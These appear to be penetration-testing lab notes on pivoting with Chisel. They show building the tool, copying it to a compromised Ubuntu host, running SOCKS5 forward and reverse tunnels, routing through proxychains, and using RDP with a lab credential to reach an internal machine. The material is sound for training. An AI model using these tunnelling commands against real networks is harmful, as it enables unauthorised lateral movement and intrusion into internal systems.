# PIVOTING WITH CHISEL


Summary: Setting Up & Using Chisel for SOCKS5 Tunneling
1. Installing & Building Chisel

Clone the Chisel repository:git clone https://github.com/jpillora/chisel.git

Build the binary (requires Go installed):cd chisel && go build

Note: If glibc version mismatches cause errors, use a prebuilt release from GitHub.




2. Transferring Chisel to the Pivot Host

Use SCP to copy the binary to the compromised machine (pivot host):scp chisel ubuntu@10.129.202.64:~/



3. Setting Up a Chisel Server (Forward Pivot)

On the pivot host (Ubuntu), start the Chisel server in SOCKS5 mode:
./chisel server -v -p 1234 --socks5

Listens on port 1234 and forwards traffic via SOCKS5.


On the attack host, connect as a Chisel client:
./chisel client -v 10.129.202.64:1234 socks

Creates a tunnel on 127.0.0.1:1080.


Configure proxychains to use the tunnel:
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf

Test the pivot (e.g., RDP to an internal host):
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123



4. Reverse Pivot (When Inbound Connections Are Blocked)

On the attack host, start a reverse Chisel server:
sudo ./chisel server --reverse -v -p 1234 --socks5

On the pivot host (Ubuntu), connect back to the attack host:
./chisel client -v 10.10.14.17:1234 R:socks
